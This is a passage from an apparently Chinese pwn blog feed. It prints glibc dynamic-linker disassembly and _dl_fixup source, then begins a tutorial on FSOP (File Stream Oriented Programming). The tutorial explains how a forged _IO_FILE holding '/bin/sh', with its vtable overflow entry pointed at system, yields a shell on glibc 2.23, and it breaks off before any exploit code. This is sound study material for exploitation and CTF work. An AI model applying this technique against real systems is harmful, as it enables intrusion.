&lt;+60&gt;:mov    QWORD PTR [rsp+0x250],rdx</span><br><span class="line">   0x00007ffff7fe7c04 &lt;+68&gt;:mov    QWORD PTR [rsp+0x258],rdx</span><br><span class="line">   0x00007ffff7fe7c0c &lt;+76&gt;:mov    QWORD PTR [rsp+0x260],rdx</span><br><span class="line">   0x00007ffff7fe7c14 &lt;+84&gt;:mov    QWORD PTR [rsp+0x268],rdx</span><br><span class="line">   0x00007ffff7fe7c1c &lt;+92&gt;:mov    QWORD PTR [rsp+0x270],rdx</span><br><span class="line">   0x00007ffff7fe7c24 &lt;+100&gt;:mov    QWORD PTR [rsp+0x278],rdx</span><br><span class="line">   0x00007ffff7fe7c2c &lt;+108&gt;:xsavec [rsp+0x40]</span><br><span class="line">   0x00007ffff7fe7c31 &lt;+113&gt;:mov    rsi,QWORD PTR [rbx+0x10]</span><br><span class="line">   0x00007ffff7fe7c35 &lt;+117&gt;:mov    rdi,QWORD PTR [rbx+0x8]</span><br><span class="line">   0x00007ffff7fe7c39 &lt;+121&gt;:call   0x7ffff7fe00c0 &lt;_dl_fixup&gt;</span><br><span class="line">   0x00007ffff7fe7c3e &lt;+126&gt;:mov    r11,rax</span><br><span class="line">   0x00007ffff7fe7c41 &lt;+129&gt;:mov    eax,0xee</span><br><span class="line">   0x00007ffff7fe7c46 &lt;+134&gt;:xor    edx,edx</span><br><span class="line">   0x00007ffff7fe7c48 &lt;+136&gt;:xrstor [rsp+0x40]</span><br><span class="line">   0x00007ffff7fe7c4d &lt;+141&gt;:mov    r9,QWORD PTR [rsp+0x30]</span><br><span class="line">   0x00007ffff7fe7c52 &lt;+146&gt;:mov    r8,QWORD PTR [rsp+0x28]</span><br><span class="line">   0x00007ffff7fe7c57 &lt;+151&gt;:mov    rdi,QWORD PTR [rsp+0x20]</span><br><span class="line">   0x00007ffff7fe7c5c &lt;+156&gt;:mov    rsi,QWORD PTR [rsp+0x18]</span><br><span class="line">   0x00007ffff7fe7c61 &lt;+161&gt;:mov    rdx,QWORD PTR [rsp+0x10]</span><br><span class="line">   0x00007ffff7fe7c66 &lt;+166&gt;:mov    rcx,QWORD PTR [rsp+0x8]</span><br><span class="line">   0x00007ffff7fe7c6b &lt;+171&gt;:mov    rax,QWORD PTR [rsp]</span><br><span class="line">   0x00007ffff7fe7c6f &lt;+175&gt;:mov    rsp,rbx</span><br><span class="line">   0x00007ffff7fe7c72 &lt;+178&gt;:mov    rbx,QWORD PTR [rsp]</span><br><span class="line">   0x00007ffff7fe7c76 &lt;+182&gt;:add    rsp,0x18</span><br><span class="line">   0x00007ffff7fe7c7a &lt;+186&gt;:bnd jmp r11</span><br></pre></td></tr></table></figure><h2 id="dl-fixup"><a href="#dl-fixup" class="headerlink" title="_dl_fixup"></a>_dl_fixup</h2><p>_dl_runtime_resolve的主体其实是调用_dl_fixup</p><p>当然_dl_fixup也调用了不少函数,暂时不深入,重点关注_dl_fixup</p><p><strong>_dl_fixup</strong>是在glibc/elf/dl-runtime.c实现的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) DL_ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span></span><br><span class="line">   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">   <span class="keyword">struct</span> link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab</span><br><span class="line">    = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">uintptr_t</span> pltgot = (<span class="type">uintptr_t</span>) D_PTR (l, l_info[DT_PLTGOT]);</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> PLTREL *<span class="type">const</span> reloc</span><br><span class="line">    = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL])</span><br><span class="line">      + reloc_offset (pltgot, reloc_arg));</span><br><span class="line">  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *refsym = sym;</span><br><span class="line">  <span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">  <span class="type">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">      used don&#x27;t look in the global scope.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum =</span><br><span class="line">    (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">    version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment"> not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment"> we are not using any threads (yet).  */</span></span><br><span class="line">      <span class="type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">&#123;</span><br><span class="line">  THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">  flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment"> of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment"> offset.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">   SYMBOL_ADDRESS (result, sym, <span class="literal">false</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment"> address) is also known.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, <span class="literal">true</span>));</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* And now perhaps the relocation addend.  */</span></span><br><span class="line">  value = elf_machine_plt_value (l, reloc, value);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Auditing checkpoint: we have a new binding.  Provide the auditing</span></span><br><span class="line"><span class="comment">     libraries the possibility to change the value and tell us whether further</span></span><br><span class="line"><span class="comment">     auditing is wanted.</span></span><br><span class="line"><span class="comment">     The l_reloc_result is only allocated if there is an audit module which</span></span><br><span class="line"><span class="comment">     provides a la_symbind.  */</span></span><br><span class="line">  <span class="keyword">if</span> (l-&gt;l_reloc_result != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* This is the address in the array where we store the result of previous</span></span><br><span class="line"><span class="comment"> relocations.  */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">reloc_result</span> *<span class="title">reloc_result</span></span></span><br><span class="line"><span class="class">=</span> &amp;l-&gt;l_reloc_result[reloc_index (pltgot, reloc_arg, <span class="keyword">sizeof</span> (PLTREL))];</span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> init = atomic_load_acquire (&amp;reloc_result-&gt;init);</span><br><span class="line">      <span class="keyword">if</span> (init == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  _dl_audit_symbind (l, reloc_result, reloc, sym, &amp;value, result, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Store the result for later runs.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (! GLRO(dl_bind_not)))</span><br><span class="line">    &#123;</span><br><span class="line">      reloc_result-&gt;addr = value;</span><br><span class="line">      <span class="comment">/* Guarantee all previous writes complete before init is</span></span><br><span class="line"><span class="comment"> updated.  See CONCURRENCY NOTES below.  */</span></span><br><span class="line">      atomic_store_release (&amp;reloc_result-&gt;init, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">value = reloc_result-&gt;addr;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Finally, fix up the plt itself.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
            <tag> elf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初探FSOP</title>
      <link href="/posts/6507/"/>
      <url>/posts/6507/</url>
      
        <content type="html"><![CDATA[<h1 id="初识"><a href="#初识" class="headerlink" title="初识"></a>初识</h1><p>FSOP 是 File Stream Oriented Programming 的缩写。所有的 _IO_FILE 结构会由 _chain 字段连接形成一个链表，<strong>由全局变量 _IO_list_all 来维护表头</strong>。而 FSOP 的核心思想就是劫持通过 _IO_list_all 的值来伪造链表和其中的 _IO_FILE 项。</p><h2 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h2><p>先看FSOP技术利用的核心函数<strong>_IO_flush_all_lockp</strong></p><p>该函数会刷新_IO_list_all 链表中所有项的文件流，<strong><u>相当于对每个 FILE 调用 fflush(更新缓存区函数)</u></strong>，也对应着会调用vtable 中的_IO_overflow(以当前io_file指针为参数)。</p><p>关键部分如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">      ......</span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">    result = EOF;</span><br><span class="line"></span><br><span class="line">      ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可见要执行_IO_OVERFLOW的前提是:</p><ol><li><strong>fp-&gt;_mode&lt;=0</strong></li><li><strong>fp-&gt;_IO_write_ptr&gt;fp-&gt;_IO_write_base</strong></li></ol><p>或者:</p><ol><li><strong>fp-&gt;_mode &gt; 0</strong></li><li><strong>_IO_vtable_offset (fp) == 0</strong></li><li><strong>fp-&gt;_wide_data-&gt;_IO_write_ptr&gt;fp-&gt;_wide_data-&gt;_IO_write_bas</strong></li></ol><p>其中<code># define _IO_vtable_offset(THIS) (THIS)-&gt;_vtable_offset</code>就是获得_IO_FILE结构体中的_vtable_offset</p><p><strong>这二者都是可行的,不过个人比较喜欢用前者更方便</strong></p><h2 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h2><p>那么该如何调用<strong>_IO_flush_all_lockp</strong></p><p>_IO_flush_all_lockp 在以下三种情况下会被系统调用：</p><ol><li><strong>当执行 abort 流程时</strong></li><li><strong>当执行 exit 函数时</strong></li><li><strong>当执行流从 main 函数返回时</strong></li></ol><h2 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h2><p>在堆中,触发错误时的malloc_printer函数会调用abort</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/abort_routine.001.jpeg" alt=""></p><h1 id="2-23利用"><a href="#2-23利用" class="headerlink" title="2.23利用"></a>2.23利用</h1><p>从以上可知只要分别伪造_IO_FILE和vtable,部署好函数调用</p><p>例如除绕过检测之外</p><ol><li>在IO_FILE开头写上b’/bin/sh\0’</li><li>IO_OVERFLOW写为system</li></ol><p>就能getshell</p><p><strong>IO_FILE</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//宏定义,如果宏_IO_USE_OLD_IO_FILE会把_IO_FILE拆成两个部分</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  <span class="type">void</span> *__pad1;</span><br><span class="line">  <span class="type">void</span> *__pad2;</span><br><span class="line">  <span class="type">void</span> *__pad3;</span><br><span class="line">  <span class="type">void</span> *__pad4;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>IO_FILE_plus</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _IO_FILE    file;</span><br><span class="line">    IO_jump_t   *vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>vtable</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>利用<strong>unsortedbin 